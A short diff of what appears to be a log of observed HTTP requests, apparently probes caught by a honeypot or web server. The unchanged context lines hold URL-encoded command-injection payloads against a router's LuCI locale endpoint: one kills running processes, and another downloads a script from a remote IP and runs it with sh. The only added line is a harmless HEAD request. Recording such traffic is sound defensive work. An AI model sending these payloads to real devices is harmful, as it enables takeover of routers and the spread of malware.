@@ -22,3 +22,4 @@
 * GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.0
 * GET http://www.ys168.com/?0.301155930654163458905783120 HTTP/1.1
 * GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.0
+* HEAD / HTTP/1.0
